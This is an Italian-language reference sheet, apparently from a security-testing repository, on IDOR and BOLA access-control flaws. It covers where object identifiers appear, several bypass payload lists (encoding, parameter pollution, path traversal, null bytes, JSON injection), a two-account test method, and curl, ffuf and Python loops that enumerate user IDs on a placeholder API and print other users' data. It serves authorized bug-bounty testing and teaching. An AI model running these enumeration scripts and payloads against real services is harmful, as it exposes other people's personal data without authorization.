# 🔓 IDOR - Insecure Direct Object Reference — scheda di riferimento

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗██████╗  ██████╗ ██████╗ 
  ██║██╔══██╗██╔═══██╗██╔══██╗
  ██║██║  ██║██║   ██║██████╔╝
  ██║██║  ██║██║   ██║██╔══██╗
  ██║██████╔╝╚██████╔╝██║  ██║
  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
   Riferimento diretto non sicuro a un oggetto (Insecure Direct Object Reference)
```

<p align="center">
  <img src="https://img.shields.io/badge/IDOR-Access_Control-red?style=for-the-badge" alt="IDOR">
  <img src="https://img.shields.io/badge/BOLA-Authorization-blue?style=for-the-badge" alt="BOLA">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

> **Nota sugli esempi:** identificativi casuali o UUID non sostituiscono i controlli di autorizzazione. Un HTTP 200 o una stringa nella risposta non dimostra da solo un IDOR: occorre verificare a quale account appartiene l’oggetto. BOLA significa Broken Object Level Authorization; la tabella originale è abbreviata. Negli esempi Base64, `echo` aggiunge una nuova riga: i risultati indicati sono illustrativi. Vedi la [guida PortSwigger](https://portswigger.net/web-security/access-control/idor).

---

## 📋 Indice

- [Che cos'è IDOR](#-che-cosè-idor)
- [Dove cercare](#-dove-cercare)
- [Tipi di identificativi e manipolazione](#-tipi-di-identificativi-e-manipolazione)
- [Tecniche di aggiramento](#-tecniche-di-aggiramento)
- [Metodologia di test](#-metodologia-di-test)
- [Strumenti e automazione](#-strumenti-e-automazione)

---

## 🎯 Che cos'è IDOR

Una vulnerabilità **IDOR** si verifica quando un'applicazione espone riferimenti diretti a oggetti interni (record di database, file e così via) senza adeguati controlli di autorizzazione.

### Impatto
- 🔴 **Furto di dati** - Accesso ai dati di altri utenti
- 🔴 **Escalation dei privilegi** - Accesso alle funzioni amministrative
- 🔴 **Compromissione degli account** - Modifica degli account altrui
- 🔴 **Manipolazione dei dati** - Eliminazione o modifica dei record

### IDOR vs BOLA
| IDOR | BOLA |
| ------ | ------ |
| Termine tradizionale | Termine usato nella sicurezza delle API |
| Autorizzazione a livello di oggetto non corretta (Broken Object Level Authorization) |

---

## 🔍 Dove cercare

### Parametri URL
```
/user/profile?id=123
/api/users/123
/download?file=report_123.pdf
/account/settings/123
/orders/view/123
```

### Corpo delle richieste POST/PUT
```json
{
  "user_id": 123,
  "account_id": 123,
  "order_id": 123
}
```

### Header
```http
X-User-ID: 123
X-Account-ID: 123
Cookie: user_id=123
```

### Parametri comuni
```
id, user_id, uid, account_id, aid
profile_id, pid, order_id, oid
doc_id, document_id, file_id
invoice_id, transaction_id, ref
customer_id, cid, member_id
```

### Endpoint comuni
```
/api/users/{id}
/api/orders/{id}
/api/invoices/{id}
/api/documents/{id}
/api/messages/{id}
/download/{id}
/files/{id}
/profile/{id}
/settings/{id}
```

---

## 🔢 Tipi di identificativi e manipolazione

### Identificativi sequenziali
```
# Il caso più comune: incrementa o decrementa l'identificativo
/api/users/1
/api/users/2
/api/users/3

# Verifica i valori limite
/api/users/0
/api/users/-1
/api/users/9999999
```

### UUIDs
```
# Verifica se è realmente casuale
550e8400-e29b-41d4-a716-446655440000
550e8400-e29b-41d4-a716-446655440001  # Incrementa l'ultima parte

# Cerca schemi ricorrenti
# UUID basati sul tempo (v1): possono rivelare schemi prevedibili
# UUID casuali (v4): più difficili da indovinare
```

### Identificativi codificati
```
# Base64
echo "123" | base64  → MTIz
echo "124" | base64  → MTI0

# Verifica gli identificativi codificati
/api/users/MTIz  → decodifica = 123
/api/users/MTI0  → decodifica = 124

# Codifica esadecimale
123 → 7b
124 → 7c
```

### Identificativi sottoposti a hashing
```
# MD5 dell'identificativo
/user/202cb962ac59075b964b07152d234b70  → md5(123)

# Prova algoritmi diversi
# Verifica se l'hash deriva dall'identificativo o è casuale
```

### Formati personalizzati
```
# Identificativi con prefisso
/user/USR_123
/order/ORD_456
/doc/DOC_789

# Basati su timestamp
/file/20240128_001
/file/20240128_002
```

---

## 🛡 Tecniche di aggiramento

### Manipolazione dei parametri
```bash
# Originale
GET /api/users/123

# Varianti
GET /api/users/124
GET /api/users/123,124
GET /api/users/123%00124
GET /api/users/[123,124]
GET /api/users?id=123&id=124
```

### Modifica del metodo HTTP
```bash
# Se GET è bloccato, prova gli altri metodi
GET /api/users/124     → Blocked
POST /api/users/124    → Allowed?
PUT /api/users/124     → Allowed?
```

### Inserimento in array o oggetti
```json
// Se id=124 è bloccato, prova:
{"id": [124]}
{"id": {"$eq": 124}}
{"ids": [123, 124]}
```

### Aggiramento mediante codifica
```
# Codifica URL
/api/users/12%34  → 124
/api/users/%31%32%34  → 124

# Doppia codifica
/api/users/%2531%2532%2534  → 124

# Unicode
/api/users/１２４  → 124 a larghezza piena
```

### Modifica di maiuscole e minuscole
```bash
/API/USERS/124
/Api/Users/124
/api/Users/124
```

### Combinazione con path traversal
```
/api/users/123/../124
/api/users/./124
/api/users/123/../../users/124
```

### Byte nullo
```
/api/users/124%00
/api/users/124%00.json
/api/users/124\x00
```

### Injection nei parametri JSON
```json
// Richiesta originale
{"user_id": 123, "action": "view"}

// Attacco
{"user_id": 124, "action": "view"}
{"user_id": "123\",\"target_id\": \"124", "action": "view"}
```

### HPP (HTTP Parameter Pollution, inquinamento dei parametri HTTP)
```
/api/user?id=123&id=124
/api/user?id=123&ID=124
/api/user?user_id=123&userid=124
```

---

## 📋 Metodologia di test

### Passo 1: individua
```
1. Mappa tutti gli endpoint con riferimenti a oggetti
2. Annota tutti i parametri che sembrano identificativi
3. Crea due account di test (utente A e utente B)
```

### Passo 2: enumera
```
1. Come utente A, annota i tuoi identificativi
2. Come utente B, annota i tuoi identificativi
3. Individua gli schemi degli identificativi
```

### Passo 3: verifica
```
1. Come utente A, prova ad accedere agli oggetti dell'utente B
2. Verifica tutte le operazioni CRUD:
   - Lettura (GET)
   - Creazione (POST)
   - Aggiornamento (PUT/PATCH)
   - Eliminazione (DELETE)
```

### Passo 4: amplia la verifica
```
1. Prova gli identificativi amministrativi (spesso 1, admin, 0 nell'esempio)
2. Prova i valori speciali (null, undefined, *)
3. Combina la verifica con altre vulnerabilità
```

### Checklist
```markdown
- [ ] Parametri URL
- [ ] Parametri nel corpo POST
- [ ] Header (cookie e personalizzati)
- [ ] Campi nascosti dei moduli
- [ ] Endpoint API
- [ ] Download di file
- [ ] Funzioni di esportazione
- [ ] Funzioni di eliminazione
- [ ] Funzioni amministrative
```

---

## 🛠 Strumenti e automazione

### Estensioni di Burp Suite
```
- Autorize (rilevamento automatico di possibili IDOR)
- AuthMatrix
- Auto Repeater
```

### Configurazione di Autorize
```
1. Installa l'estensione Autorize
2. Copia il cookie di sessione dell'utente B
3. Aggiungilo ad Autorize
4. Naviga come utente A
5. Autorize esegue i test con la sessione dell'utente B
```

### Test manuali con curl
```bash
# Token dell'utente A
TOKEN_A="user_a_jwt_token"

# Prova la risorsa dell'utente B
curl -H "Authorization: Bearer $TOKEN_A" \
     https://api.target.com/users/124

# Scorri gli identificativi
for i in {1..100}; do
  curl -s -H "Authorization: Bearer $TOKEN_A" \
       "https://api.target.com/users/$i" | grep -q "email" && echo "IDOR: $i"
done
```

### ffuf per IDOR
```bash
# Identificativi numerici
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w <(seq 1 1000) \
     -mc 200

# Con una wordlist
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w ids.txt \
     -mc 200 -fc 403,404
```

### Script Python
```python
import requests

base_url = "https://api.target.com/users/"
headers = {"Authorization": "Bearer USER_A_TOKEN"}
my_id = 123

for i in range(1, 1000):
    if i == my_id:
        continue
    r = requests.get(f"{base_url}{i}", headers=headers)
    if r.status_code == 200:
        print(f"[IDOR] Accessible: {i}")
        print(r.json())
```

---

## 📊 Riferimento rapido

### Funzionalità comunemente vulnerabili
| Funzione | Rischio |
| ---------- | ------ |
| Visualizzazione del profilo | Esposizione di dati |
| Download di file | Accesso ai file |
| Eliminazione di un elemento | Perdita di dati |
| Aggiornamento delle impostazioni | Compromissione dell'account |
| Visualizzazione degli ordini | Violazione della riservatezza |
| Esportazione dei dati | Furto di dati su vasta scala |

### Che cosa segnalare
```markdown
## IDOR nel profilo utente

**Endpoint:** GET /api/users/{id}

**Passaggi:**
1. Accedi come utente A (ID: 123)
2. Richiedi GET /api/users/124
3. Osserva che vengono restituiti i dati dell'utente B

**Impatto:** Qualsiasi utente autenticato può accedere
alle informazioni personali di tutti gli altri utenti.

**PoC:**
curl -H "Authorization: Bearer [token]" \
     https://api.target.com/users/124
```

---

## 💡 Consigli pratici

1. **Usa due account** - Esegui sempre i test con due account
2. **Verifica tutti i metodi** - GET, POST, PUT, DELETE
3. **Cerca ovunque** - URL, corpo, header e cookie
4. **Prova i casi limite** - 0, -1, null, undefined
5. **Combina gli attacchi** - IDOR + CSRF, IDOR + XSS
6. **Verifica le esportazioni** - Le esportazioni PDF e CSV possono essere vulnerabili
7. **API mobili** - Nell'originale sono descritte come spesso meno sicure delle API web

---

## 📚 Risorse

- [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [HackTricks IDOR](https://book.hacktricks.xyz/pentesting-web/idor)
- [PortSwigger Access Control](https://portswigger.net/web-security/access-control/idor)

---

<p align="center">
  <b>🔓 Individua le vulnerabilità IDOR!</b><br>
  <i>Solo per test autorizzati!</i>
</p>
